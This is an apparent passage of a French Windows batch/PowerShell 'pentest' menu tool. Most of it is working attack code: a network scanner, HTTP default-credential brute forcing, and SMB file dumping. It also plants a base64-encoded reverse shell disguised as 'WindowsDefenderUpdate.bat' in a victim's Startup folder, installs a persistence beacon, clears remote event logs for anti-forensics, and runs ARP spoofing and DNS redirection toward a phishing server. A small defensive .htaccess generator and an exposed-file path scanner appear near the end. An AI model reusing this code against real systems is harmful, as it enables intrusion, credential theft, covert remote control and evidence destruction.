echo       elseif ($p -eq 22^) { Write-Host " -> SSH detecte" -f Cyan }
echo       elseif ($p -eq 21^) { Write-Host " -> FTP detecte (Risque de sniffing)" -f Yellow }
echo       elseif ($p -eq 80 -or $p -eq 443^) { Write-Host " -> Serveur Web detecte" -f Gray }
echo       else { Write-Host "" }
echo     }
echo   } catch {} finally { $t.Close(^) }
echo }
echo Write-Host "`r[*] Scan termine. $found port(s) identifie(s).           " -f Gray
echo if ($found -eq 0^) { Write-Host " [i] Aucun service critique expose n'a ete trouve." -f Yellow }
) > "%SC_FILE%"

powershell -NoProfile -ExecutionPolicy Bypass -File "%SC_FILE%"
if exist "%SC_FILE%" del /f /q "%SC_FILE%"
echo.
echo  --- Scan termine. Appuyez sur une touche pour retourner au menu ---
pause >nul
goto cyber_remote_menu

:start_lan_scan
echo.
echo  [i] Demarrage du Scan des failles... Appuyez sur ECHAP pour annuler.
echo.
set "SCPS=%TEMP%\advanced_turbo_scan.ps1"
if exist "%SCPS%" del "%SCPS%"

>  "%SCPS%" echo $oui = @{'B8-27-EB'='Raspberry Pi';'DC-A6-32'='Raspberry Pi';'E4-5F-01'='Raspberry Pi';'00-1E-C2'='Apple';'AC-87-A3'='Apple';'64-16-7F'='Apple';'A4-77-33'='Samsung';'48-D6-D5'='Xiaomi';'00-1A-11'='Google';'00-FF-BB'='Microsoft';'38-07-16'='Freebox';'E4-9E-12'='Freebox';'00-11-32'='Synology'}
>> "%SCPS%" echo $targetInput = "%base_ip%"
>> "%SCPS%" echo if ($targetInput -eq 'AUTO') {
>> "%SCPS%" echo     $route = Get-NetRoute -DestinationPrefix '0.0.0.0/0' ^| Sort-Object RouteMetric ^| Select-Object -First 1
>> "%SCPS%" echo     $myIp = (Get-NetIPAddress -InterfaceIndex $route.InterfaceIndex -AddressFamily IPv4).IPAddress
>> "%SCPS%" echo     $base = ($myIp -split '\.')[0..2] -join '.'
>> "%SCPS%" echo     $ipsToScan = 1..254 ^| ForEach-Object { "$base.$_" }
>> "%SCPS%" echo     Write-Host "  Cible   : $base.1 a $base.254" -f Cyan
>> "%SCPS%" echo } elseif ($targetInput -match '^\d{1,3}\.\d{1,3}\.\d{1,3}$') {
>> "%SCPS%" echo     $ipsToScan = 1..254 ^| ForEach-Object { "$targetInput.$_" }
>> "%SCPS%" echo     Write-Host "  Cibles  : $targetInput.1 a $targetInput.254" -f Cyan
>> "%SCPS%" echo } else {
>> "%SCPS%" echo     $ipsToScan = @($targetInput)
>> "%SCPS%" echo     Write-Host "  Cible   : $targetInput" -f Cyan
>> "%SCPS%" echo }
>> "%SCPS%" echo $jobs = $ipsToScan ^| ForEach-Object {
>> "%SCPS%" echo     $target = $_
>> "%SCPS%" echo     [PowerShell]::Create().AddScript({
>> "%SCPS%" echo         param($ip, $ouiMap)
>> "%SCPS%" echo         $res = @{ IP = $ip; Status = 'Down'; Name = ''; Brand = 'Inconnu'; Ports = @() }
>> "%SCPS%" echo         $p = New-Object System.Net.NetworkInformation.Ping
>> "%SCPS%" echo         try {
>> "%SCPS%" echo             $reply = $p.Send($ip, 400)
>> "%SCPS%" echo             if ($reply.Status -eq 'Success') {
>> "%SCPS%" echo                 $res.Status = 'Up'
>> "%SCPS%" echo                 try { $res.Name = [System.Net.Dns]::GetHostEntry($ip).HostName } catch { $res.Name = "Inconnu" }
>> "%SCPS%" echo                 $arp = Get-NetNeighbor -IPAddress $ip -EA SilentlyContinue ^| Select-Object -First 1
>> "%SCPS%" echo                 if ($arp) {
>> "%SCPS%" echo                     $mac = $arp.LinkLayerAddress.ToUpper().Replace(':','-')
>> "%SCPS%" echo                     $prefix = if($mac.Length -ge 8){$mac.Substring(0,8)}else{''}
>> "%SCPS%" echo                     if ($ouiMap.ContainsKey($prefix)) { $res.Brand = $ouiMap[$prefix] }
>> "%SCPS%" echo                 }
>> "%SCPS%" echo                 $testPorts = @(21, 22, 23, 80, 443, 445, 3389, 8080)
>> "%SCPS%" echo                 foreach ($pt in $testPorts) {
>> "%SCPS%" echo                     $tcp = New-Object System.Net.Sockets.TcpClient
>> "%SCPS%" echo                     try {
>> "%SCPS%" echo                         $connect = $tcp.BeginConnect($ip, $pt, $null, $null)
>> "%SCPS%" echo                         if ($connect -and $connect.AsyncWaitHandle.WaitOne(70, $false) -and $tcp.Connected) { $res.Ports += $pt }
>> "%SCPS%" echo                     } catch {} finally { $tcp.Close() }
>> "%SCPS%" echo                 }
>> "%SCPS%" echo             }
>> "%SCPS%" echo         } catch {}
>> "%SCPS%" echo         return $res
>> "%SCPS%" echo     }).AddArgument($target).AddArgument($oui)
>> "%SCPS%" echo }
>> "%SCPS%" echo $running = $jobs ^| ForEach-Object { @{ Obj = $_; Async = $_.BeginInvoke(); IP = $_.Commands.Commands[0].Parameters[0].Value } }
>> "%SCPS%" echo while ($running.Count -gt 0) {
>> "%SCPS%" echo     if ($Host.UI.RawUI.KeyAvailable) { if ($Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown').VirtualKeyCode -eq 27) { break } }
>> "%SCPS%" echo     $done = $running ^| Where-Object { $_.Async.IsCompleted -eq $true }
>> "%SCPS%" echo     foreach ($j in $done) {
>> "%SCPS%" echo         $r = $j.Obj.EndInvoke($j.Async)
>> "%SCPS%" echo         if ($r.Status -eq 'Up') {
>> "%SCPS%" echo             Write-Host ("`r" + " " * 100 + "`r") -NoNewline
>> "%SCPS%" echo             Write-Host "  [+] $($r.IP.PadRight(15))" -NoNewline -f Green
>> "%SCPS%" echo             Write-Host " - $($r.Brand) " -NoNewline -f Yellow
>> "%SCPS%" echo             Write-Host "($($r.Name))" -f Gray
>> "%SCPS%" echo             if ($r.Ports.Count -gt 0) { Write-Host "      Ports ouverts : $($r.Ports -join ', ')" -f Cyan }
>> "%SCPS%" echo             if ($r.Ports -contains 445) { Write-Host "      [!] Faille potentielle critique : SMB" -f Red }
>> "%SCPS%" echo             if ($r.Ports -contains 3389) { Write-Host "      [!] RDP Ouvert (Risque d'attaque/Bruteforce)" -f Yellow }
>> "%SCPS%" echo             if ($r.Ports -contains 21 -or $r.Ports -contains 23) { Write-Host "      [!] Protocoles en texte clair securite faible (FTP/Telnet)" -f Red }
>> "%SCPS%" echo             if ($r.Ports -contains 5985) { Write-Host "      [!] WinRM Actif" -f Yellow }
>> "%SCPS%" echo             $r.IP ^| Out-File -Append "%TEMP%\found_ips.txt" -Encoding ASCII
>> "%SCPS%" echo         }
>> "%SCPS%" echo         $running = $running ^| Where-Object { $_.Async -ne $j.Async }
>> "%SCPS%" echo     }
>> "%SCPS%" echo     if ($running.Count -gt 0) { Write-Host ("`r  [>] Analyse IP : $($running[0].IP.PadRight(15)) ($($running.Count) restantes)...") -NoNewline -f DarkGray }
>> "%SCPS%" echo     Start-Sleep -m 20
>> "%SCPS%" echo }

if exist "%TEMP%\found_ips.txt" del "%TEMP%\found_ips.txt"
powershell -NoProfile -ExecutionPolicy Bypass -File "%SCPS%"
if exist "%SCPS%" del "%SCPS%"

echo.
set "opts=Audit de penetration ^& Brute Force~Analyse exhaustive des ports et test des acces par defaut via base RockYou.;Lister les partages Windows (SMB) ^& Enumeration~Identification des dossiers reseau et extraction utilisateurs via IPC$.;Post-Exploitation (Explorer une cible compromise)~Naviguer dans les fichiers distants, recuperer des infos systeme ou dumper le Bureau.;Retour~Retour au menu principal"
call :DynamicMenu "SCAN TERMINE !" "%opts%" "NONUMS NOCLS"
set "nxt=%errorlevel%"
if "%nxt%"=="1" goto lan_all_deep
if "%nxt%"=="2" goto lan_all_smb
if "%nxt%"=="3" goto cyber_smb_explorer
goto net_cyber_menu

:cyber_smb_explorer
cls
echo.
echo  ================================================
echo   EXPLORATEUR FURTIF ET ANTI-FORENSICS
echo  ================================================
if not exist "%TEMP%\found_ips.txt" (
    echo [!] Aucune cible connue.
    pause & goto net_cyber_menu
)

echo Cibles detectees :
type "%TEMP%\found_ips.txt"
echo.
set /p "target_ip=IP de la cible a explorer : "
if "%target_ip%"=="" goto net_cyber_menu

:smb_exp_menu
cls
echo  Cible : %target_ip% | MODE : EXPERT
echo  ------------------------------------------------
set "opts=Lister C:;Explorer le Bureau;Infos Systeme;Installer Persistance;Reverse Shell B64;Dumping Documents;NETTOYER LES LOGS;MITM / Spoofing;EXFILTRATION (Discord/Telegram);AUDIT EXPOSITION;Retour"
call :DynamicMenu "PENTEST EXPERT : %target_ip%" "%opts%" "NONUMS"
set "smb_sel=%errorlevel%"

if "%smb_sel%"=="1" (
    cls ^& echo Liste de C:\ sur %target_ip% :
    dir "\\%target_ip%\C$" /A /B 2^>nul
    pause ^& goto smb_exp_menu
)
if "%smb_sel%"=="2" (
    cls ^& echo Liste des profils :
    dir "\\%target_ip%\C$\Users" /B /A:D 2^>nul
    set /p "user_target=User : "
    if not "!user_target!"=="" dir "\\%target_ip%\C$\Users\!user_target!\Desktop"
    pause ^& goto smb_exp_menu
)
if "%smb_sel%"=="3" (
    cls ^& echo Infos systeme de %target_ip% :
    systeminfo /S %target_ip%
    pause ^& goto smb_exp_menu
)
if "%smb_sel%"=="4" (
    cls
    echo [i] Configuration du Beacon de persistance...
    if "!user_target!"=="" set /p "user_target=Utilisateur cible : "
    set "remote_startup=\\%target_ip%\C$\Users\%user_target%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
    if not exist "!remote_startup!" (
        echo [!] Chemin Startup introuvable.
        pause ^& goto smb_exp_menu
    )
    >  "%TEMP%\win_sync.bat" echo @echo off
    >> "%TEMP%\win_sync.bat" echo powershell -nop -w hidden -c "Add-Content -Path '\\%COMPUTERNAME%\C$\Users\%USERNAME%\Desktop\victimes.log' -Value ('[ONLINE] ' + $env:COMPUTERNAME + ' at ' + (Get-Date))"
    copy "%TEMP%\win_sync.bat" "!remote_startup!\WinSync.bat" /Y ^>nul
    echo [OK] Persistance installee.
    del "%TEMP%\win_sync.bat" 2^>nul
    pause ^& goto smb_exp_menu
)
if "%smb_sel%"=="5" (
    cls
    echo [!] Generation de la Reverse Shell B64 (Bypass Defender)...
    for /f "tokens=4" %%a in ('route print ^| findstr 0.0.0.0 ^| findstr /v 127.0.0.1') do set "MYIP=%%a"
    set "MYIP=!MYIP: =!"
    if "!user_target!"=="" set /p "user_target=Utilisateur cible : "
    set "remote_startup=\\%target_ip%\C$\Users\%user_target%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
    
    REM Prepare la commande PowerShell pure
    set "ps_cmd=$c=New-Object Net.Sockets.TCPClient('!MYIP!',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$x=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($x,0,$x.Length);$s.Flush()};$c.Close()"
    
    REM Encodage B64 pour bypasser Defender
    powershell -NoProfile -Command "$bytes = [System.Text.Encoding]::Unicode.GetBytes('!ps_cmd!'); $encoded = [Convert]::ToBase64String($bytes); 'powershell -nop -w hidden -enc ' + $encoded | Out-File '%TEMP%\enc_rev.txt' -Encoding ASCII"
    set /p B64_PAYLOAD=<"%TEMP%\enc_rev.txt"
    
    >  "%TEMP%\win_def_update.bat" echo @echo off
    >> "%TEMP%\win_def_update.bat" echo !B64_PAYLOAD!
    
    copy "%TEMP%\win_def_update.bat" "!remote_startup!\WindowsDefenderUpdate.bat" /Y ^>nul
    echo [OK] Reverse shell obfusquee injectee !
    echo [!] Ecoutez sur votre PC (Port 4444) : powershell ncat -lvp 4444
    del "%TEMP%\enc_rev.txt" 2^>nul
    del "%TEMP%\win_def_update.bat" 2^>nul
    pause ^& goto smb_exp_menu
)
if "%smb_sel%"=="6" goto smb_dump_action
if "%smb_sel%"=="7" goto smb_cleanup_logs
if "%smb_sel%"=="8" goto cyber_mitm_module
if "%smb_sel%"=="9" goto cyber_exfiltrate_webhook
if "%smb_sel%"=="10" goto cyber_exposure_audit
goto net_cyber_menu


REM ===================================================================
REM       NOUVEAU MODULE : INTERCEPTION MITM (ARP SPOOFING)
REM ===================================================================
:cyber_mitm_module
cls
echo.
echo  ================================================
echo   MODULE D'INTERCEPTION MAN-IN-THE-MIDDLE
echo  ================================================
echo.
echo   [1] Lancer ARP Spoofing (Detournement de trafic)
echo       Fait passer tout le trafic de la cible par ton PC.
echo.
echo   [2] Sniffer le trafic HTTP (Mots de passe clairs)
echo       Cherche les identifiants tapes sur les sites non-securises.
echo.
echo   [3] DNS Poisoning (Redirection vers faux sites)
echo       Redirige la victime vers une IP de ton choix.
echo.
echo   [4] Retour
echo.
set /p "mitm_choice=Action : "

if "%mitm_choice%"=="1" goto mitm_spoof
if "%mitm_choice%"=="2" goto mitm_sniff
if "%mitm_choice%"=="3" goto mitm_dns
goto smb_exp_menu

:mitm_spoof
cls
echo [!] RECUPERATION DE LA PASSERELLE...
for /f "tokens=3" %%a in ('netsh interface ip show config ^| findstr "Passerelle par d"') do set "GW=%%a"
echo Cible     : %target_ip%
echo Passerelle: %GW%
echo.
echo [i] Lancement de l'empoisonnement ARP via PowerShell...
echo [i] Appuyez sur CTRL+C pour arreter.
echo.
powershell -Command "$t='%target_ip%'; $g='%GW%'; while($true){ arp -s $t (get-netadapter | where status -eq 'up').MacAddress; arp -s $g (get-netadapter | where status -eq 'up').MacAddress; Write-Host 'Envoi paquets empoisonnes...' -f Yellow; Start-Sleep -s 2 }"
pause ^& goto cyber_mitm_module

:mitm_sniff
cls
echo  ================================================
echo   SNIFFER DE MOTS DE PASSE (HTTP)
echo  ================================================
echo  Analyse des paquets entrants en cours...
echo  (Requiert le mode Spoofing actif dans une autre fenetre)
echo.
powershell -Command "Write-Host 'En attente de donnees POST/GET...' -f Cyan; $adapter = Get-NetAdapter | Where Status -eq 'Up' | Select-Object -First 1; netsh trace start capture=yes report=no tracefile=$env:TEMP\trace.etl; Write-Host 'Capture en cours... Appuyez sur une touche pour stopper et extraire.' -f Yellow; $null = [Console]::ReadKey(); netsh trace stop; Write-Host 'Analyse du fichier trace...' -f Gray"
echo.
echo [INFO] Pour voir les mots de passe, ouvrez le fichier %TEMP%\trace.etl avec Wireshark.
pause ^& goto cyber_mitm_module

:mitm_dns
cls
echo.
echo  ================================================
echo   DNS POISONING (REDIRECTION DE SITES)
echo  ================================================
echo   Description : Intercepte les requetes DNS pour 
echo   envoyer la victime vers ton IP au lieu du vrai site.
echo.
set /p "site_cible=Domaine a detourner (ex: facebook.com) : "
set /p "votre_ip=IP de votre serveur de phishing : "

echo [i] Configuration de la table de redirection...
REM On utilise le fichier 'hosts' local pour simuler le poisoning si on est en MITM
(
echo %votre_ip% %site_cible%
echo %votre_ip% www.%site_cible%
) > "%TEMP%\dns_table.txt"

echo.
echo [OK] Redirection active. 
echo [!] Note : Pour que cela fonctionne, l'ARP Spoofing (Option 1)
echo     doit etre actif et ton PC doit faire tourner un serveur Web.
echo.
echo [i] Conseil : Utilise 'Python -m http.server 80' pour tester.
pause & goto cyber_mitm_module


REM --- FONCTIONS DE NETTOYAGE ET DUMPING AMELIOREES ---
:smb_dump_action
cls
echo [DUMPING] Collecte des documents sensibles...
if "!user_target!"=="" set /p "user_target=Utilisateur cible : "
set "DUMP_DIR=%USERPROFILE%\Desktop\DUMP_%target_ip%"
if not exist "!DUMP_DIR!" mkdir "!DUMP_DIR!" 2^>nul
echo [+] Copie des fichiers .txt, .pdf, .docx du Bureau et des Documents...
xcopy "\\%target_ip%\C$\Users\%user_target%\Desktop\*.txt" "%DUMP_DIR%\" /Y /Q /S /I 2^>nul
xcopy "\\%target_ip%\C$\Users\%user_target%\Documents\*.pdf" "%DUMP_DIR%\" /Y /Q /S /I 2^>nul
echo [OK] Dumping termine dans : Bureau\DUMP_%target_ip%
pause ^& goto smb_exp_menu

:smb_cleanup_logs
cls
echo [!] Nettoyage des traces sur %target_ip%...
powershell -NoProfile -Command "Invoke-Command -ComputerName %target_ip% -ScriptBlock { Get-WinEvent -ListLog * | ForEach-Object { try { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($_.LogName) } catch {} } }" 2^>nul
if %errorlevel% neq 0 (
    powershell -Command "wmic /node:'%target_ip%' nteventlog where 'LogfileName=''System''' call cleareventlog" ^>nul
    powershell -Command "wmic /node:'%target_ip%' nteventlog where 'LogfileName=''Security''' call cleareventlog" ^>nul
    powershell -Command "wmic /node:'%target_ip%' nteventlog where 'LogfileName=''Application''' call cleareventlog" ^>nul
)
echo [OK] Logs effaces. Furtivite assuree.
pause ^& goto smb_exp_menu




:lan_all_deep
cls
echo.
echo  ================================================
echo   AUDIT DE PENETRATION ^& BRUTE FORCE (REAL LEAKS)
echo  ================================================
if not exist "%TEMP%\found_ips.txt" (
    echo [!] Aucune cible detectee. Lancez d'abord un scan reseau.
    pause & goto net_cyber_menu
)

set "SCRIPT_DIR=%~dp0"
if "%SCRIPT_DIR:~-1%"=="\" set "SCRIPT_DIR=%SCRIPT_DIR:~0,-1%"
set "BRUTE_FILE=%SCRIPT_DIR%\bruteforce.txt"
set "SUCCESS_LOG=%SCRIPT_DIR%\penetration_success.log"

if not exist "%BRUTE_FILE%" (
    echo [i] Creation du dictionnaire bruteforce.txt...
    >  "%BRUTE_FILE%" echo admin:admin
    >> "%BRUTE_FILE%" echo admin:password
    >> "%BRUTE_FILE%" echo admin:123456
    >> "%BRUTE_FILE%" echo root:root
    >> "%BRUTE_FILE%" echo root:toor
    >> "%BRUTE_FILE%" echo user:123456
    >> "%BRUTE_FILE%" echo pi:raspberry
)

echo [i] Succes enregistres dans : penetration_success.log
echo.


set "SCDP=%TEMP%\aggressive_audit.ps1"
>  "%SCDP%" echo $ips = Get-Content "%TEMP%\found_ips.txt"
>> "%SCDP%" echo $creds = Get-Content "%BRUTE_FILE%"
>> "%SCDP%" echo foreach ($ip in $ips) {
>> "%SCDP%" echo     if ([string]::IsNullOrWhiteSpace($ip)) { continue }
>> "%SCDP%" echo     Write-Host ">>> ANALYSE PROFONDE : $ip" -f Cyan -b Black
>> "%SCDP%" echo     $ports = @(21,22,23,80,443,445,3389,8080)
>> "%SCDP%" echo     $openPorts = @()
>> "%SCDP%" echo     foreach ($port in $ports) {
>> "%SCDP%" echo         $socket = New-Object System.Net.Sockets.TcpClient
>> "%SCDP%" echo         try {
>> "%SCDP%" echo             $connect = $socket.BeginConnect($ip, $port, $null, $null)
>> "%SCDP%" echo             if ($connect.AsyncWaitHandle.WaitOne(100, $false) -and $socket.Connected) {
>> "%SCDP%" echo                 Write-Host "  [+] Port $port OUVERT" -f Green
>> "%SCDP%" echo                 $openPorts += $port
>> "%SCDP%" echo                 $stream = $socket.GetStream()
>> "%SCDP%" echo                 $stream.Write([System.Text.Encoding]::ASCII.GetBytes("`r`n"), 0, 2)
>> "%SCDP%" echo                 Start-Sleep -m 150
>> "%SCDP%" echo                 if ($socket.Available -gt 0) {
>> "%SCDP%" echo                     $buf = New-Object byte[] 1024
>> "%SCDP%" echo                     $len = $stream.Read($buf, 0, 1024)
>> "%SCDP%" echo                     $banner = [System.Text.Encoding]::ASCII.GetString($buf, 0, $len).Trim() -replace '[^a-zA-Z0-9\/\.\_\-\ ]',''
>> "%SCDP%" echo                     if($banner){ Write-Host "      > Version : $banner" -f Gray }
>> "%SCDP%" echo                 }
>> "%SCDP%" echo             }
>> "%SCDP%" echo         } catch {} finally { $socket.Close() }
>> "%SCDP%" echo     }
>> "%SCDP%" echo     foreach ($port in $openPorts) {
>> "%SCDP%" echo         if ($port -eq 80 -or $port -eq 8080) {
>> "%SCDP%" echo             Write-Host "      [~] Test Brute Force HTTP..." -f DarkGray
>> "%SCDP%" echo             foreach($line in $creds) {
>> "%SCDP%" echo                 $u, $p = $line.Split(':'); if($null -eq $p){$p=""}
>> "%SCDP%" echo                 try {
>> "%SCDP%" echo                     $pair = "$u`:$p"; $bytes = [System.Text.Encoding]::ASCII.GetBytes($pair)
>> "%SCDP%" echo                     $h = @{Authorization="Basic $([Convert]::ToBase64String($bytes))"}
>> "%SCDP%" echo                     $r = Invoke-WebRequest -Uri "http://${ip}:$port" -Headers $h -TimeoutSec 1 -ErrorAction Stop -UseBasicParsing
>> "%SCDP%" echo                     if ($r.StatusCode -eq 200) { 
>> "%SCDP%" echo                         Write-Host "      [!!!] ACCES TROUVE : $u / $p" -f Red -b White
>> "%SCDP%" echo                         "[SUCCESS] ${ip}:$port | $u / $p" ^| Out-File "%SUCCESS_LOG%" -Append; break 
>> "%SCDP%" echo                     }
>> "%SCDP%" echo                 } catch {}
>> "%SCDP%" echo             }
>> "%SCDP%" echo         }
>> "%SCDP%" echo     }
>> "%SCDP%" echo     Write-Host "------------------------------------------------" -f DarkGray
>> "%SCDP%" echo }

powershell -NoProfile -ExecutionPolicy Bypass -File "%SCDP%"
if exist "%SCDP%" del "%SCDP%"

echo.
echo [OK] Audit termine.
if exist "%SUCCESS_LOG%" (
    echo [i] Des succes ont ete detectes. Tentative d'envoi par mail...
    call :SendAuditMail "%SUCCESS_LOG%" "Succes de Penetration"
) else (
    echo [-] Aucun acces trouve, aucun mail envoye.
)
pause
goto net_cyber_menu

:lan_all_smb
cls
echo.
echo  ================================================
echo   AUDIT SMB ET ENUMERATION (IPC$)
echo  ================================================
set "SMBPS=%TEMP%\smb_audit.ps1"
>  "%SMBPS%" echo $ips = Get-Content "%TEMP%\found_ips.txt"
>> "%SMBPS%" echo foreach ($ip in $ips) {
>> "%SMBPS%" echo     if ([string]::IsNullOrWhiteSpace($ip)) { continue }
>> "%SMBPS%" echo     Write-Host ">>> CIBLE SMB : $ip" -f Cyan
>> "%SMBPS%" echo     net view "\\$ip" /all 2^>$null ^| ForEach-Object { Write-Host "  $_" -f Gray }
>> "%SMBPS%" echo     Write-Host "  [~] Test acces anonyme..." -f DarkGray
>> "%SMBPS%" echo     $test = net use "\\$ip\IPC$" "" /u:"" 2^>^&1
>> "%SMBPS%" echo     if ($test -match 'reussie^|completed') { Write-Host "  [!!!] SESSION ANONYME OUVERTE" -f Red; net use "\\$ip\IPC$" /d /y ^>$null }
>> "%SMBPS%" echo     Write-Host "------------------------------------" -f DarkGray
>> "%SMBPS%" echo }
powershell -NoProfile -ExecutionPolicy Bypass -File "%SMBPS%"
if exist "%SMBPS%" del "%SMBPS%"
pause
goto net_cyber_menu
    Write-Host "  [1/3] Liste des ressources :" -f Yellow
>> "%SMBPS%" echo     $shares = net view "\\$ip" /all 2^>$null
>> "%SMBPS%" echo     if ($shares) { 
>> "%SMBPS%" echo         $shares ^| ForEach-Object { Write-Host "      $_" -f Gray } 
>> "%SMBPS%" echo     } else { Write-Host "      [!] Aucun partage visible ou acces refuse." -f DarkGray }
>> "%SMBPS%" echo     Write-Host "  [2/3] Tentative d'enumeration via IPC$ :" -f Yellow
>> "%SMBPS%" echo     try {
>> "%SMBPS%" echo         $null = net use "\\$ip\IPC$" "" /u:"" 2^>$null
>> "%SMBPS%" echo         $users = Get-WmiObject -Class Win32_UserAccount -ComputerName $ip -ErrorAction SilentlyContinue
>> "%SMBPS%" echo         if ($users) {
>> "%SMBPS%" echo             Write-Host "      [OK] Utilisateurs detectes :" -f Green
>> "%SMBPS%" echo             $users ^| ForEach-Object { Write-Host "      - $($_.Name) (Admin: $($_.LocalAccount))" -f White }
>> "%SMBPS%" echo         } else {
>> "%SMBPS%" echo             Write-Host "      [-] Enumeration RPC/WMI bloquee." -f DarkGray
>> "%SMBPS%" echo         }
>> "%SMBPS%" echo     } catch { Write-Host "      [-] Erreur de connexion IPC." -f DarkGray }
>> "%SMBPS%" echo     Write-Host "  [3/3] Test d'ecriture sur partages communs :" -f Yellow
>> "%SMBPS%" echo     $commonShares = @('C$', 'ADMIN$', 'Users', 'Public', 'Temp')
>> "%SMBPS%" echo     foreach ($s in $commonShares) {
>> "%SMBPS%" echo         $testPath = "\\$ip\$s\aleex_test.txt"
>> "%SMBPS%" echo         try {
>> "%SMBPS%" echo             "Test" ^| Out-File $testPath -ErrorAction Stop
>> "%SMBPS%" echo             Write-Host "      [!!!] ALERTE : Acces en ECRITURE trouve sur \\$ip\$s" -f Red -b White
>> "%SMBPS%" echo             Remove-Item $testPath -Force -ErrorAction SilentlyContinue
>> "%SMBPS%" echo         } catch {
>> "%SMBPS%" echo             Write-Host "      [-] $s : Lecture seule ou Protege." -f DarkGray
>> "%SMBPS%" echo         }
>> "%SMBPS%" echo     }
>> "%SMBPS%" echo     net use "\\$ip\IPC$" /d /y ^>$null 2^>^&1
>> "%SMBPS%" echo     Write-Host "------------------------------------------------" -f DarkGray
>> "%SMBPS%" echo }

powershell -NoProfile -ExecutionPolicy Bypass -File "%SMBPS%"
if exist "%SMBPS%" del "%SMBPS%"

echo.
echo Audit SMB termine.
pause
goto net_cyber_menu

:cyber_gen_htaccess
cls
echo.
echo  ===========================================================
echo   GENERATEUR DE CONFIGURATION SECURITE (.HTACCESS)
echo  ===========================================================
echo.
echo  [i] Copiez ce bloc de code dans le fichier .htaccess a la
echo      racine de votre site pour securiser les headers.
echo.
echo  -----------------------------------------------------------
echo  # SECURISATION DES HEADERS (ALEEXLEDEV)
echo  Header set X-Frame-Options "SAMEORIGIN"
echo  Header set X-XSS-Protection "1; mode=block"
echo  Header set X-Content-Type-Options "nosniff"
echo  Header set Content-Security-Policy "upgrade-insecure-requests"
echo  Header set Referrer-Policy "strict-origin-when-cross-origin"
echo  Header set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
echo  ServerSignature Off
echo  -----------------------------------------------------------
echo.
echo  [?] Voulez-vous enregistrer ce code dans un fichier sur
echo      votre Bureau ? (O/N)
set /p "save_choice=Choix : "
if /i "%save_choice%"=="O" (
    set "OUT_HT=%USERPROFILE%\Desktop\security_htaccess.txt"
    (
        echo # SECURISATION DES HEADERS (ALEEXLEDEV)
        echo Header set X-Frame-Options "SAMEORIGIN"
        echo Header set X-XSS-Protection "1; mode=block"
        echo Header set X-Content-Type-Options "nosniff"
        echo Header set Content-Security-Policy "upgrade-insecure-requests"
        echo Header set Referrer-Policy "strict-origin-when-cross-origin"
        echo Header set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
        echo ServerSignature Off
    ) > "%USERPROFILE%\Desktop\security_htaccess.txt"
    echo.
    echo  [OK] Fichier enregistre sur le Bureau : security_htaccess.txt
)
pause
goto net_cyber_menu


:cyber_exposed_files
cls
echo.
echo  ===========================================================
echo   SCAN FICHIERS SENSIBLES EXPOSES
echo  ===========================================================
echo   Detecte les fichiers critiques (.env, .git)
echo   laisses par erreur sur un serveur web.
echo.
echo  Entrez l'URL cible (ex: https://monsite.com)
set "ALEEX_EXPOSED_URL="
set /p "ALEEX_EXPOSED_URL=URL : "
if not defined ALEEX_EXPOSED_URL goto net_cyber_menu

set "EFS=%TEMP%\exposed_files.ps1"
if exist "%EFS%" del /f /q "%EFS%"

echo $url = $env:ALEEX_EXPOSED_URL.TrimEnd('/') >> "%EFS%"
echo $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" >> "%EFS%"
echo $found = 0 >> "%EFS%"
echo $paths = @( >> "%EFS%"
echo    # Configs et secrets >> "%EFS%"
echo    '/.env', '/.env.local', '/.env.backup', '/.env.prod', '/.env.dev', >> "%EFS%"
echo    '/config.php', '/config.php.bak', '/configuration.php', '/settings.php', >> "%EFS%"
echo    '/wp-config.php', '/wp-config.php.bak', '/wp-config.php.old', >> "%EFS%"
echo    '/database.yml', '/database.php', '/db.php', '/db_config.php', >> "%EFS%"
echo    '/config.yml', '/config.yaml', '/config.json', '/app.config', >> "%EFS%"
echo    '/secrets.yml', '/credentials.json', '/auth.json', >> "%EFS%"
echo    # Backups >> "%EFS%"
echo    '/backup.zip', '/backup.tar.gz', '/backup.sql', '/dump.sql', >> "%EFS%"
echo    '/site.zip', '/www.zip', '/htdocs.zip', '/public_html.zip', >> "%EFS%"
echo    '/db_backup.sql', '/database.sql', '/mysql.sql', >> "%EFS%"
echo    '/backup/', '/backups/', '/old/', '/archive/', >> "%EFS%"
echo    # Logs >> "%EFS%"
echo    '/error.log', '/error_log', '/access.log', '/debug.log', >> "%EFS%"
echo    '/logs/', '/log/', '/php_errors.log', '/laravel.log', >> "%EFS%"
echo    '/storage/logs/laravel.log', '/app/storage/logs/laravel.log', >> "%EFS%"
echo    # Git/SVN exposes >> "%EFS%"
echo    '/.git/config', '/.git/HEAD', '/.git/COMMIT_EDITMSG', >> "%EFS%"
echo    '/.svn/entries', '/.htpasswd', '/.htaccess', >> "%EFS%"
echo    # Admin / panels >> "%EFS%"
echo    '/admin/', '/admin/login', '/administrator/', '/phpmyadmin/', >> "%EFS%"
echo    '/wp-admin/', '/cpanel/', '/panel/', '/dashboard/', >> "%EFS%"
echo    '/adminer.php', '/adminer/', '/phpinfo.php', '/info.php', >> "%EFS%"
echo    # APIs et tokens >> "%EFS%"
echo    '/api/v1/users', '/api/v1/config', '/api/users', '/api/admin', >> "%EFS%"
echo    '/api/keys', '/api/token', '/v1/users', '/graphql', >> "%EFS%"
echo    # Divers >> "%EFS%"
echo    '/robots.txt', '/sitemap.xml', '/crossdomain.xml', >> "%EFS%"
echo    '/server-status', '/server-info', '/.well-known/security.txt', >> "%EFS%"
echo    '/readme.html', '/README.md', '/CHANGELOG.md', '/composer.json', >> "%EFS%"
echo    '/package.json', '/yarn.lock', '/Gemfile', '/requirements.txt' >> "%EFS%"
echo ) >> "%EFS%"
echo. >> "%EFS%"
echo Write-Host "  Scan de $($paths.Count) chemins sur $url" -f Cyan >> "%EFS%"
echo Write-Host "" >> "%EFS%"
echo. >> "%EFS%"
